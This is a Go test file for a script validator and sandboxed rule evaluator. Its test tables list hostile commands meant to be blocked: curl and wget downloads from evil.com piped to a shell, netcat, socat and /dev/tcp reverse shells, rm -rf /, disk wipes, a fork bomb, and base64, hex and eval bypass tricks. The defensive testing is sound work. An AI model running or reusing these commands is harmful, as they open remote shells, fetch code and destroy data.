package quality

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ---------------------------------------------------------------------------
// validateScript unit tests
// ---------------------------------------------------------------------------

func TestValidateScript_EmptyScript(t *testing.T) {
	assert.Error(t, validateScript(""))
	assert.Error(t, validateScript("   "))
}

func TestValidateScript_ExceedsMaxLength(t *testing.T) {
	long := strings.Repeat("a", maxScriptLength+1)
	err := validateScript(long)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "exceeds maximum length")
}

func TestValidateScript_AtMaxLength(t *testing.T) {
	exact := strings.Repeat("a", maxScriptLength)
	assert.NoError(t, validateScript(exact))
}

func TestValidateScript_DangerousPatterns(t *testing.T) {
	dangerous := []struct {
		name   string
		script string
	}{
		{"sudo", "sudo rm -rf /tmp/foo"},
		{"su", "su root -c 'whoami'"},
		{"rm -rf", "rm -rf /"},
		{"rm -rf nested", "rm -rf /var/data"},
		{"mkfs", "mkfs.ext4 /dev/sda1"},
		{"dd of=/dev", "dd if=/dev/zero of=/dev/sda bs=1M"},
		{"shutdown", "shutdown -h now"},
		{"reboot", "reboot"},
		{"kill -9 -1", "kill -9 -1"},
		{"killall", "killall nginx"},
		{"pkill", "pkill -9 node"},
		{"curl pipe bash", "curl http://evil.com/install.sh | bash"},
		{"wget pipe sh", "wget -qO- http://evil.com/x | sh"},
		{"netcat reverse shell", "nc -e /bin/bash 10.0.0.1 4444"},
		{"bash /dev/tcp", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
		{"fork bomb", ":(){  :|:  & };:"},
		{"tee /etc/passwd", "echo 'x' | tee /etc/passwd"},
		{"chmod +s", "chmod +s /usr/bin/vim"},
		{"chown root", "chown root /tmp/exploit"},
	}

	for _, tc := range dangerous {
		t.Run(tc.name, func(t *testing.T) {
			err := validateScript(tc.script)
			require.Error(t, err, "expected script to be rejected: %s", tc.script)
			assert.Contains(t, err.Error(), "dangerous command pattern")
		})
	}
}

func TestValidateScript_BypassPatterns(t *testing.T) {
	bypass := []struct {
		name   string
		script string
	}{
		{"base64 decode", "echo cHduZWQ= | base64 -d | bash"},
		{"base64 --decode", "base64 --decode < payload.txt | sh"},
		{"eval variable", "eval $PAYLOAD"},
		{"eval substitution", "eval $(cat /tmp/cmd)"},
		{"heredoc bash", "bash <<EOF\nrm -rf /\nEOF"},
		{"heredoc python", "python3 <<SCRIPT\nimport os\nSCRIPT"},
		{"python -c", "python3 -c 'import os; os.system(\"id\")'"},
		{"perl -e", "perl -e 'system(\"id\")'"},
		{"ruby -e", "ruby -e 'system(\"id\")'"},
		{"node -e", "node -e 'process.exit(0)'"},
		{"node --eval", "node --eval 'console.log(1)'"},
		{"php -r", "php -r 'system(\"id\");'"},
		{"lua -e", "lua -e 'os.execute(\"id\")'"},
		{"socat reverse shell", "socat -e /bin/bash 10.0.0.1:4444"},
		{"bash /dev/udp", "bash -i >& /dev/udp/10.0.0.1/4444 0>&1"},
		{"indirect expansion", `${!cmd}`},
		{"substring extraction", `${PATH:0:1}`},
		{"printf hex", `printf '\x73\x75\x64\x6f' | bash`},
		{"export PATH", `export PATH=/tmp:$PATH`},
		{"source script", `source /tmp/evil.sh`},
		{"dot source", `. /tmp/evil.sh`},
		{"sh -c bypass", `sh -c 'echo pwned'`},
		{"dash -c bypass", `dash -c 'echo pwned'`},
		{"bash -c bypass", `bash -c 'echo pwned'`},
		{"zsh -c bypass", `zsh -c 'echo pwned'`},
		{"awk system", `awk 'BEGIN{system("echo pwned")}'`},
		{"gawk system", `gawk 'BEGIN{system("id")}'`},
		{"mawk system", `mawk 'BEGIN{system("id")}'`},
		// Generic pipe to shell (bash --restricted bypass)
		{"pipe to bash", `echo cmd | bash`},
		{"pipe to sh", `cat script.sh | sh`},
		{"pipe to /bin/bash", `printf 'cmd' | /bin/bash`},
		{"pipe to /bin/sh", `echo test | /bin/sh`},
		{"pipe to /usr/bin/bash", `echo test | /usr/bin/bash`},
		{"pipe to /usr/bin/sh", `echo test | /usr/bin/sh`},
		// Absolute path shell invocation
		{"/bin/bash direct", `/bin/bash script.sh`},
		{"/bin/sh direct", `/bin/sh script.sh`},
		{"/usr/bin/bash direct", `/usr/bin/bash -c 'echo pwned'`},
		{"/bin/sh after semicolon", `echo ok; /bin/sh`},
	}

	for _, tc := range bypass {
		t.Run(tc.name, func(t *testing.T) {
			err := validateScript(tc.script)
			require.Error(t, err, "expected bypass pattern to be blocked: %s", tc.script)
			assert.Contains(t, err.Error(), "dangerous command pattern")
		})
	}
}

func TestValidateScript_SafeScripts(t *testing.T) {
	safe := []string{
		"echo hello",
		"true",
		"exit 0",
		"test -f /tmp/foo && echo exists",
		"ls -la /tmp",
		"wc -l < /tmp/report.txt",
		"date +%s",
		"go test ./...",
		"cat /tmp/report.txt | wc -l",
		"bash_completion=true",
		"echo $SHELL",
		"which bash",
	}

	for _, s := range safe {
		t.Run(s, func(t *testing.T) {
			assert.NoError(t, validateScript(s))
		})
	}
}

// ---------------------------------------------------------------------------
// scriptEvaluator integration tests
// ---------------------------------------------------------------------------

func TestScriptEvaluator_NormalExecution(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         "true",
		TimeoutSeconds: 5,
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.True(t, passed)
}

func TestScriptEvaluator_FailingScript(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         "false",
		TimeoutSeconds: 5,
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.False(t, passed)
}

func TestScriptEvaluator_EnvironmentRestricted(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	// The script should only see the minimal env vars we set.
	// HOME should be /tmp, not the real user home.
	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         `test "$HOME" = "/tmp"`,
		TimeoutSeconds: 5,
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.True(t, passed, "HOME should be /tmp in sandboxed environment")
}

func TestScriptEvaluator_PathRestricted(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	// Verify PATH is restricted to /usr/bin:/bin only
	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         `test "$PATH" = "/usr/bin:/bin"`,
		TimeoutSeconds: 5,
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.True(t, passed, "PATH should be restricted to /usr/bin:/bin")
}

func TestScriptEvaluator_DangerousScriptRejected(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         "sudo echo pwned",
		TimeoutSeconds: 5,
	}

	_, err := eval.Evaluate(ctx, cond, evalCtx)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "dangerous command pattern")
}

func TestScriptEvaluator_TooLongScriptRejected(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         strings.Repeat("echo ok;", maxScriptLength/8+1),
		TimeoutSeconds: 5,
	}

	_, err := eval.Evaluate(ctx, cond, evalCtx)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "exceeds maximum length")
}

func TestScriptEvaluator_Timeout(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         "sleep 30",
		TimeoutSeconds: 1,
	}

	start := time.Now()
	_, err := eval.Evaluate(ctx, cond, evalCtx)
	elapsed := time.Since(start)

	require.Error(t, err)
	assert.Contains(t, err.Error(), "timed out")
	assert.Less(t, elapsed, 5*time.Second, "should timeout quickly")
}

func TestScriptEvaluator_RestrictedModePreventsSlashCommands(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	// In bash restricted mode, executing commands with slashes should fail
	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         "/usr/bin/env echo hello",
		TimeoutSeconds: 5,
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.False(t, passed, "restricted bash should reject commands with path slashes")
}

func TestScriptEvaluator_RestrictedModePreventsRedirection(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	// In bash restricted mode, output redirection should fail
	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "bash",
		Script:         "echo test > /tmp/testfile",
		TimeoutSeconds: 5,
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.False(t, passed, "restricted bash should reject output redirection")
}

func TestScriptEvaluator_UnsupportedLanguage(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:           ConditionScript,
		Language:       "ruby",
		Script:         "puts 'hello'",
		TimeoutSeconds: 5,
	}

	_, err := eval.Evaluate(ctx, cond, evalCtx)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "unsupported script language")
}

func TestScriptEvaluator_DefaultTimeout(t *testing.T) {
	// Verify that a script with TimeoutSeconds=0 gets the default 30s timeout
	// (just checks it doesn't panic; doesn't actually wait 30s)
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{}}

	cond := &RuleCondition{
		Type:     ConditionScript,
		Language: "bash",
		Script:   "echo ok",
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.True(t, passed)
}

func TestScriptEvaluator_CompiledScriptTakesPrecedence(t *testing.T) {
	eval := &scriptEvaluator{}
	ctx := context.Background()
	evalCtx := &mapEvaluationContext{data: map[string]interface{}{"key": "val"}}

	called := false
	cond := &RuleCondition{
		Type:     ConditionScript,
		Language: "bash",
		Script:   "false", // would fail if executed as shell
		CompiledScript: func(ctx context.Context, data map[string]interface{}) (bool, error) {
			called = true
			return true, nil
		},
	}

	passed, err := eval.Evaluate(ctx, cond, evalCtx)
	require.NoError(t, err)
	assert.True(t, passed)
	assert.True(t, called, "compiled script function should have been called")
}

// ---------------------------------------------------------------------------
// fieldValidationEvaluator — CaseSensitive tests
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// validateScriptForLanguage — Python language-specific detection
// ---------------------------------------------------------------------------

func TestValidateScriptForLanguage_PythonDangerousPatterns(t *testing.T) {
	dangerous := []struct {
		name   string
		script string
	}{
		{"os.system", `import os; os.system("id")`},
		{"os.popen", `os.popen("ls")`},
		{"subprocess", `import subprocess; subprocess.run(["ls"])`},
		{"from subprocess", `from subprocess import check_output`},
		{"__import__", `__import__('os').system('id')`},
		{"importlib", `import importlib; importlib.import_module('os')`},
		{"eval", `eval('1+1')`},
		{"exec", `exec('print(1)')`},
		{"socket.socket", `import socket; s = socket.socket()`},
		{"ctypes", `import ctypes`},
	}

	for _, tc := range dangerous {
		t.Run(tc.name, func(t *testing.T) {
			err := validateScriptForLanguage(tc.script, "python")
			require.Error(t, err, "expected Python dangerous pattern to be blocked: %s", tc.script)
			assert.Contains(t, err.Error(), "dangerous command pattern")
		})
	}
}

func TestValidateScriptForLanguage_PythonSafeScripts(t *testing.T) {
	safe := []string{
		"print('hello world')",
		"x = 1 + 2",
		"import json; json.dumps({'key': 'value'})",
		"import math; math.sqrt(4)",
		"result = [i for i in range(10)]",
	}

	for _, s := range safe {
		t.Run(s, func(t *testing.T) {
			assert.NoError(t, validateScriptForLanguage(s, "python"))
		})
	}
}

func TestValidateScriptForLanguage_PythonCommonPatternsApply(t *testing.T) {
	// Common dangerous patterns (privilege escalation, destructive commands)
	// should still be checked for Python scripts even though they're shell-syntax
	dangerous := []struct {
		name   string
		script string
	}{
		{"sudo in string", `os.system("sudo rm -rf /tmp")`},
		{"rm -rf in string", `cmd = "rm -rf /var/data"`},
	}

	for _, tc := range dangerous {
		t.Run(tc.name, func(t *testing.T) {
			err := validateScriptForLanguage(tc.script, "python")
			require.Error(t, err, "expected common dangerous pattern to be blocked in Python: %s", tc.script)
		})
	}
}

func TestValidateScriptForLanguage_ShellBypassNotAppliedToPython(t *testing.T) {
	// Shell bypass patterns (like 'sh -c', heredocs) are not relevant for Python
	// and should NOT be applied to Python scripts. Pure Python code that happens
	// to contain these strings (e.g., in a string literal) should not be blocked
	// if it doesn't match common or Python-specific patterns.
	scripts := []string{
		// Python code that contains 'sh -c' as data, not as a shell command
		`config = {"shell": "sh -c echo test"}`,
	}

	for _, s := range scripts {
		t.Run(s, func(t *testing.T) {
			// Should pass for Python (shell bypass not applied)
			assert.NoError(t, validateScriptForLanguage(s, "python"),
				"shell bypass pattern should not block Python script")
			// Should be blocked for shell (bypass pattern applies)
			assert.Error(t, validateScriptForLanguage(s, "bash"),
				"shell bypass pattern should block shell script")
		})
	}
}

// ---------------------------------------------------------------------------
// M28: Strengthened eval/bypass patterns
// ---------------------------------------------------------------------------

func TestValidateScript_QuotedEvalBlocked(t *testing.T) {
	scripts := []struct {
		name   string
		script string
	}{
		{"single-quoted eval", `'eval' $PAYLOAD`},
		{"double-quoted eval", `"eval" $PAYLOAD`},
		{"eval with empty quotes", `eval'' $PAYLOAD`},
	}

	for _, tc := range scripts {
		t.Run(tc.name, func(t *testing.T) {
			err := validateScript(tc.script)
			require.Error(t, err, "expected quoted eval to be blocked: %s", tc.script)
			assert.Contains(t, err.Error(), "dangerous command pattern")
		})
	}
}

func TestValidateScript_SubstringExtractionWithSpace(t *testing.T) {
	// ${var: 0:1} with space before digit should be caught
	scripts := []string{
		`${PATH: 0:1}`,
		`${PATH:	0:1}`, // tab before digit
	}

	for _, s := range scripts {
		t.Run(s, func(t *testing.T) {
			err := validateScript(s)
			require.Error(t, err, "expected substring extraction with space to be blocked: %s", s)
			assert.Contains(t, err.Error(), "dangerous command pattern")
		})
	}
}

// ---------------------------------------------------------------------------
// M27: Type-aware compareValues
// ---------------------------------------------------------------------------

func TestFieldValidation_CompareValuesTypeAware(t *testing.T) {
	eval := &fieldValidationEvaluator{}

	tests := []struct {
		name          string
		a, b          interface{}
		caseSensitive bool
		want          bool
	}{
		{"int vs int equal", 42, 42, true, true},
		{"int vs float64 equal", 1, 1.0, true, true},
		{"float64 vs float64 equal", 3.14, 3.14, true, true},
		{"int vs float64 not equal", 1, 1.5, true, false},
		{"bool true vs true", true, true, true, true},
		{"bool true vs false", true, false, true, false},
		{"bool vs string", true, "true", true, true},
		{"string vs string", "abc", "abc", true, true},
		{"int vs string representation", 42, "42", true, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := eval.compareValues(tt.a, tt.b, tt.caseSensitive)
			assert.Equal(t, tt.want, got)
		})
	}
}

// ---------------------------------------------------------------------------
// fieldValidationEvaluator — CaseSensitive tests
// ---------------------------------------------------------------------------

func TestFieldValidation_CaseSensitiveEquals(t *testing.T) {
	eval := &fieldValidationEvaluator{}
	ctx := context.Background()

	tests := []struct {
		name          string
		value         string
		target        string
		caseSensitive bool
		want          bool
	}{
		{"case-sensitive match", "Hello", "Hello", true, true},
		{"case-sensitive mismatch", "Hello", "hello", true, false},
		{"case-insensitive match", "Hello", "hello", false, true},
		{"case-insensitive match upper", "HELLO", "hello", false, true},
		{"case-insensitive mismatch", "Hello", "world", false, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			evalCtx := &mapEvaluationContext{data: map[string]interface{}{"field": tt.value}}
			cond := &RuleCondition{
				Type:          ConditionFieldValidation,
				Field:         "field",
				Operator:      OpEquals,
				Value:         tt.target,
				CaseSensitive: tt.caseSensitive,
			}
			got, err := eval.Evaluate(ctx, cond, evalCtx)
			require.NoError(t, err)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestFieldValidation_CaseSensitiveNotEquals(t *testing.T) {
	eval := &fieldValidationEvaluator{}
	ctx := context.Background()

	tests := []struct {
		name          string
		value         string
		target        string
		caseSensitive bool
		want          bool
	}{
		{"case-sensitive different", "Hello", "hello", true, true},
		{"case-sensitive same", "Hello", "Hello", true, false},
		{"case-insensitive same", "Hello", "hello", false, false},
		{"case-insensitive different", "Hello", "world", false, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			evalCtx := &mapEvaluationContext{data: map[string]interface{}{"field": tt.value}}
			cond := &RuleCondition{
				Type:          ConditionFieldValidation,
				Field:         "field",
				Operator:      OpNotEquals,
				Value:         tt.target,
				CaseSensitive: tt.caseSensitive,
			}
			got, err := eval.Evaluate(ctx, cond, evalCtx)
			require.NoError(t, err)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestFieldValidation_CaseSensitiveIn(t *testing.T) {
	eval := &fieldValidationEvaluator{}
	ctx := context.Background()

	tests := []struct {
		name          string
		value         string
		list          interface{}
		caseSensitive bool
		want          bool
	}{
		{"case-sensitive found", "Hello", []interface{}{"Hello", "World"}, true, true},
		{"case-sensitive not found", "hello", []interface{}{"Hello", "World"}, true, false},
		{"case-insensitive found", "hello", []interface{}{"Hello", "World"}, false, true},
		{"case-insensitive string list", "hello", []string{"Hello", "World"}, false, true},
		{"case-insensitive comma list", "hello", "Hello,World", false, true},
		{"case-sensitive comma not found", "hello", "Hello,World", true, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			evalCtx := &mapEvaluationContext{data: map[string]interface{}{"field": tt.value}}
			cond := &RuleCondition{
				Type:          ConditionFieldValidation,
				Field:         "field",
				Operator:      OpIn,
				Value:         tt.list,
				CaseSensitive: tt.caseSensitive,
			}
			got, err := eval.Evaluate(ctx, cond, evalCtx)
			require.NoError(t, err)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestFieldValidation_CaseSensitiveContains(t *testing.T) {
	eval := &fieldValidationEvaluator{}
	ctx := context.Background()

	tests := []struct {
		name          string
		value         string
		target        string
		caseSensitive bool
		want          bool
	}{
		{"case-sensitive found", "Hello World", "World", true, true},
		{"case-sensitive not found", "Hello World", "world", true, false},
		{"case-insensitive found", "Hello World", "world", false, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			evalCtx := &mapEvaluationContext{data: map[string]interface{}{"field": tt.value}}
			cond := &RuleCondition{
				Type:          ConditionFieldValidation,
				Field:         "field",
				Operator:      OpContains,
				Value:         tt.target,
				CaseSensitive: tt.caseSensitive,
			}
			got, err := eval.Evaluate(ctx, cond, evalCtx)
			require.NoError(t, err)
			assert.Equal(t, tt.want, got)
		})
	}
}
